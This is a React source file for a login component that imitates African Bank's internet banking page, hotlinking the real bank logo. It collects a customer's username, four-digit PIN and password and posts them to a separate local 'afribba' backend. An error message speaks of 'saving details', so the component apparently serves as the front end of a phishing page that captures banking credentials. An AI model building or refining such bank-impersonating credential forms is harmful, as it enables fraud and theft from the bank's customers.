import React, { useState } from 'react';
import axios from 'axios';
import styles from './Login.module.css';

const AfricanBankLogin = () => {
    // Add loading state
    const [credentials, setCredentials] = useState({
        username: '',
        pin: '',
        password: ''
    });
    const [loading, setLoading] = useState(false);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);            // ← now defined
        try {
            const { data } = await axios.post(
                'http://localhost:8080/afribba/api/auth/login',
                credentials
            );
            alert(data);
            setCredentials({ username: '', pin: '', password: '' });
        } catch (err) {
            alert('Error saving details: ' + (err.response?.data || err.message));
        } finally {
            setLoading(false);         // ← now defined
        }
    };

    const handleChange = (e) => {
        const { name, value } = e.target;
        setCredentials(prev => ({
            ...prev,
            [name]: value
        }));
    };

    return (
        <div className={styles.container}>
            <div className={styles.logoContainer}>
                <img
                    src="https://ib.africanbank.co.za/Content/themes/AfricanBank/images/header/ab_dark_logo.svg?289"
                    alt="African Bank Logo"
                    className={styles.bankLogo}
                />
            </div>
            <h2 className={styles.welcome}>Welcome</h2>

            <div className={styles.loginContainer}>
                <div className={styles.loginHeader}>
                    <h3 className={styles.loginDetails}>Login details</h3>
                    <div className={styles.blueUnderline}></div>
                </div>

                <form onSubmit={handleSubmit} className={styles.form}>
                    <div className={styles.inputGroup}>
                        <label htmlFor="username" className={styles.inputLabel}>Username</label>
                        <input
                            type="text"
                            id="username"
                            name="username"
                            value={credentials.username}
                            onChange={handleChange}
                            className={styles.inputField}
                            required
                        />
                    </div>

                    <div className={styles.inputGroup}>
                        <label htmlFor="pin" className={styles.inputLabel}>PIN</label>
                        <input
                            type="password"
                            id="pin"
                            name="pin"
                            value={credentials.pin}
                            onChange={handleChange}
                            className={styles.inputField}
                            inputMode="numeric"
                            maxLength="4"
                            required
                        />
                    </div>

                    <div className={styles.inputGroup}>
                        <label htmlFor="password" className={styles.inputLabel}>Password</label>
                        <input
                            type="password"
                            id="password"
                            name="password"
                            value={credentials.password}
                            onChange={handleChange}
                            className={styles.inputField}
                            required
                        />
                    </div>

                    <button type="submit" className={styles.loginButton}>
                        Login
                    </button>
                </form>
            </div>
        </div>
    );
};

export default AfricanBankLogin;